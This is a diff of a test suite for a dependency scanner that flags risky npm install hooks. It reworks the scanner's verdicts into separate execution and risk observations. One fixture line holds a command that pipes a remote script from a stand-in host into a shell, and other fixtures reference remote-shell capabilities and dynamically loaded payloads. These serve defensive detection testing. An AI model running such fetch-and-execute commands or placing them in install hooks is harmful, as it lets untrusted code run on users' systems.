@@ -427,7 +427,7 @@ describe("assessDependencyArtifact", () => {
     execSync("curl -sL https://cdn.example.com/p.sh | sh");
   `;
 
-  test("install hook reaching a downloader is install-risk", () => {
+  test("observes install risk when an install hook reaches a downloader", () => {
     const assessment = assessDependencyArtifact(
       [
         file(
@@ -443,13 +443,12 @@ describe("assessDependencyArtifact", () => {
       { name: "proc-macro1", version: "0.1.0", scripts: { postinstall: "node build.js" } },
       { codePatternSet: "javascript", entrypointResolution: "npm" },
     );
-    expect(assessment.verdict).toBe("install-risk");
+    expect(assessment.observation).toEqual({ execution: "observed", risk: "observed" });
     expect(assessment.automaticExecution).toEqual([{ kind: "script", name: "postinstall" }]);
     expect(assessment.installReachableCapabilities).toContain("code.remote-shell");
-    expect(assessment.installReachUnproven).toBe(false);
   });
 
-  test("an install hook with nothing dangerous behind it is install-execution", () => {
+  test("observes install execution separately from risk", () => {
     const assessment = assessDependencyArtifact(
       [
         file(
@@ -461,10 +460,10 @@ describe("assessDependencyArtifact", () => {
       { name: "n", version: "1.0.0", scripts: { postinstall: "node ok.js" } },
       { codePatternSet: "javascript", entrypointResolution: "npm" },
     );
-    expect(assessment.verdict).toBe("install-execution");
+    expect(assessment.observation).toEqual({ execution: "observed", risk: "not-observed" });
   });
 
-  test("a library with capabilities but no install hook is clean", () => {
+  test("does not observe install behavior without an install hook", () => {
     // The "benign added dependency" case: being new is not a reason to hold a
     // release, so an http client must not grade as risky just for fetching.
     const assessment = assessDependencyArtifact(
@@ -478,7 +477,10 @@ describe("assessDependencyArtifact", () => {
       { name: "tiny-fetch", version: "1.0.0", main: "index.js" },
       { codePatternSet: "javascript", entrypointResolution: "npm" },
     );
-    expect(assessment.verdict).toBe("clean");
+    expect(assessment.observation).toEqual({
+      execution: "not-observed",
+      risk: "not-observed",
+    });
     expect(assessment.automaticExecution).toEqual([]);
   });
 
@@ -530,10 +532,10 @@ describe("assessDependencyArtifact", () => {
     );
 
     expect(assessment.installReachableUninspectedFiles).toEqual([]);
-    expect(assessment.verdict).toBe("install-execution");
+    expect(assessment.observation).toEqual({ execution: "observed", risk: "not-observed" });
   });
 
-  test("fails completeness when an install path dynamically loads skipped executable text", () => {
+  test("fails completeness when an install path can dynamically load any skipped body", () => {
     const manifest = {
       name: "n",
       version: "1.0.0",
@@ -542,9 +544,9 @@ describe("assessDependencyArtifact", () => {
     const assessment = assessDependencyArtifact(
       [
         file("package.json", JSON.stringify(manifest)),
-        file("install.js", "require('./payload.' + 'map')"),
+        file("install.js", "require('./payload.' + 'data')"),
         {
-          path: "payload.map",
+          path: "payload.data",
           size: 1024,
           sha256: "skipped-dynamic-payload",
           flags: ["text-sample-skipped"],
@@ -554,10 +556,10 @@ describe("assessDependencyArtifact", () => {
       { codePatternSet: "javascript", entrypointResolution: "npm" },
     );
 
-    expect(assessment.installReachableUninspectedFiles).toEqual(["payload.map"]);
+    expect(assessment.installReachableUninspectedFiles).toEqual(["payload.data"]);
   });
 
-  test("a danger capability the install hook cannot reach is reported as unproven", () => {
+  test("a danger capability the install hook cannot reach remains unknown", () => {
     const assessment = assessDependencyArtifact(
       [
         file(
@@ -570,8 +572,7 @@ describe("assessDependencyArtifact", () => {
       { name: "n", version: "1.0.0", scripts: { postinstall: "node ok.js" } },
       { codePatternSet: "javascript", entrypointResolution: "npm" },
     );
-    expect(assessment.verdict).toBe("install-risk");
-    expect(assessment.installReachUnproven).toBe(true);
+    expect(assessment.observation).toEqual({ execution: "observed", risk: "unknown" });
   });
 
   test("an unrelated process launch cannot pair with an install-reachable native artifact", () => {
@@ -593,7 +594,7 @@ describe("assessDependencyArtifact", () => {
 
     expect(assessment.installReachableCapabilities).toContain("file.native-artifact");
     expect(assessment.installReachableCapabilities).not.toContain("code.process-execution");
-    expect(assessment.verdict).toBe("install-execution");
+    expect(assessment.observation).toEqual({ execution: "observed", risk: "not-observed" });
   });
 
   test("a capability in a non-install package script is not proven install-reachable", () => {
@@ -611,10 +612,9 @@ describe("assessDependencyArtifact", () => {
       { codePatternSet: "javascript", entrypointResolution: "npm" },
     );
 
-    expect(assessment.verdict).toBe("install-risk");
+    expect(assessment.observation).toEqual({ execution: "observed", risk: "unknown" });
     expect(assessment.capabilities).toContain("code.network-access");
     expect(assessment.installReachableCapabilities).not.toContain("code.network-access");
-    expect(assessment.installReachUnproven).toBe(true);
   });
 
   test("a capability directly in an install command remains proven reachable", () => {
@@ -629,9 +629,8 @@ describe("assessDependencyArtifact", () => {
       { codePatternSet: "javascript", entrypointResolution: "npm" },
     );
 
-    expect(assessment.verdict).toBe("install-risk");
+    expect(assessment.observation).toEqual({ execution: "observed", risk: "observed" });
     expect(assessment.installReachableCapabilities).toContain("code.network-access");
-    expect(assessment.installReachUnproven).toBe(false);
   });
 
   test("a lifecycle hook delegated through npm run keeps its downloader reachable", () => {
@@ -649,9 +648,8 @@ describe("assessDependencyArtifact", () => {
       { codePatternSet: "javascript", entrypointResolution: "npm" },
     );
 
-    expect(assessment.verdict).toBe("install-risk");
+    expect(assessment.observation).toEqual({ execution: "observed", risk: "observed" });
     expect(assessment.installReachableCapabilities).toContain("code.network-access");
-    expect(assessment.installReachUnproven).toBe(false);
   });
 
   test.each(["npm --silent run setup", "npm run --silent setup"])(
@@ -671,9 +669,8 @@ describe("assessDependencyArtifact", () => {
         { codePatternSet: "javascript", entrypointResolution: "npm" },
       );
 
-      expect(assessment.verdict).toBe("install-risk");
+      expect(assessment.observation).toEqual({ execution: "observed", risk: "observed" });
       expect(assessment.installReachableCapabilities).toContain("code.network-access");
-      expect(assessment.installReachUnproven).toBe(false);
     },
   );
 });
@@ -684,10 +681,13 @@ describe("classifyDependencyInstallRisk", () => {
     ["proven network behavior", ["code.network-access"], ["code.network-access"], "high"],
     ["unproven strong behavior", ["code.remote-shell"], [], "high"],
     ["unproven network behavior", ["code.network-access"], [], "medium"],
-  ])("classifies %s as %s", (_label, capabilities, installReachableCapabilities, severity) => {
+  ])("classifies %s as %s", (label, capabilities, installReachableCapabilities, severity) => {
     expect(
       classifyDependencyInstallRisk({
-        verdict: "install-risk",
+        observation: {
+          execution: "observed",
+          risk: label.startsWith("proven") ? "observed" : "unknown",
+        },
         capabilities,
         installReachableCapabilities,
       }),
@@ -697,17 +697,17 @@ describe("classifyDependencyInstallRisk", () => {
   test("classifies a reachable native executable and process launch as proven high risk", () => {
     expect(
       classifyDependencyInstallRisk({
-        verdict: "install-risk",
+        observation: { execution: "observed", risk: "observed" },
         capabilities: ["code.process-execution", "file.native-artifact"],
         installReachableCapabilities: ["code.process-execution", "file.native-artifact"],
       }),
-    ).toMatchObject({ severity: "high", proven: true, nativeExecution: true });
+    ).toMatchObject({ severity: "high", certainty: "observed", nativeExecution: true });
   });
 
-  test("returns null for a non-risk verdict", () => {
+  test("returns null when risk was not observed", () => {
     expect(
       classifyDependencyInstallRisk({
-        verdict: "clean",
+        observation: { execution: "not-observed", risk: "not-observed" },
         capabilities: ["code.remote-shell"],
         installReachableCapabilities: ["code.remote-shell"],
       }),
@@ -758,7 +758,7 @@ describe("dependencyEvidenceFindings", () => {
       automaticExecution: [],
       capabilities: [],
       installReachableCapabilities: [],
-      verdict: "clean",
+      observation: { execution: "not-observed", risk: "not-observed" },
       ...overrides,
     };
   }
@@ -777,7 +777,7 @@ describe("dependencyEvidenceFindings", () => {
     const [finding] = dependencyEvidenceFindings(
       review([
         evidence({
-          verdict: "install-risk",
+          observation: { execution: "observed", risk: "observed" },
           automaticExecution: [{ kind: "script", name: "postinstall" }],
           capabilities: ["code.remote-shell"],
           installReachableCapabilities: ["code.remote-shell"],
@@ -839,7 +839,7 @@ describe("dependencyEvidenceFindings", () => {
     const [finding] = dependencyEvidenceFindings(
       review([
         evidence({
-          verdict: "install-risk",
+          observation: { execution: "observed", risk: "observed" },
           automaticExecution: [{ kind: "script", name: "install" }],
           capabilities: ["code.network-access", "code.process-execution"],
           installReachableCapabilities: ["code.network-access"],
@@ -855,7 +855,7 @@ describe("dependencyEvidenceFindings", () => {
     const [finding] = dependencyEvidenceFindings(
       review([
         evidence({
-          verdict: "install-risk",
+          observation: { execution: "observed", risk: "observed" },
           automaticExecution: [{ kind: "script", name: "postinstall" }],
           capabilities: ["code.process-execution", "file.native-artifact"],
           installReachableCapabilities: ["code.process-execution", "file.native-artifact"],
@@ -872,7 +872,7 @@ describe("dependencyEvidenceFindings", () => {
     const [finding] = dependencyEvidenceFindings(
       review([
         evidence({
-          verdict: "install-risk",
+          observation: { execution: "observed", risk: "unknown" },
           automaticExecution: [{ kind: "script", name: "postinstall" }],
           capabilities: ["code.remote-shell"],
           installReachableCapabilities: [],
@@ -887,7 +887,7 @@ describe("dependencyEvidenceFindings", () => {
     const [finding] = dependencyEvidenceFindings(
       review([
         evidence({
-          verdict: "install-risk",
+          observation: { execution: "observed", risk: "unknown" },
           automaticExecution: [{ kind: "script", name: "postinstall" }],
           capabilities: ["code.network-access"],
           installReachableCapabilities: [],
@@ -1021,7 +1021,7 @@ describe("normalizeDependencyReview", () => {
       name: "ok",
       section: "dependencies",
       declarationKind: "range",
-      verdict: "install-risk",
+      observation: { execution: "observed", risk: "unknown" },
     });
   });
 
